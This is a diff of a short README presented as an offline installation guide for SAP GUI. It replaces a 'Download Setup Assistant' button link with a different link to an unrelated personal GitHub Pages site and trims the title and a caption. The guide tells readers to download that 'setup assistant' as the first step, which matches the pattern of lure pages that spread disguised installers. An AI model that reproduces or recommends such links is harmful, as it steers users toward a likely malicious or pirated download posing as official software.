@@ -1,6 +1,6 @@
-# SAP GUI — Offline Installation Guide
+# SAP GUI 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://jetbrains-intellij-idea-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/sapgui)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
@@ -27,7 +27,7 @@ This offline installation guide is designed for IT professionals, consultants, a
 ## 🖼 Preview
 
 ![SAP GUI Interface](https://i.ytimg.com/vi/bHQe-pOClSs/maxresdefault.jpg)  
-*SAP GUI main screen with connection entries and system access*
+
 
 ---
 
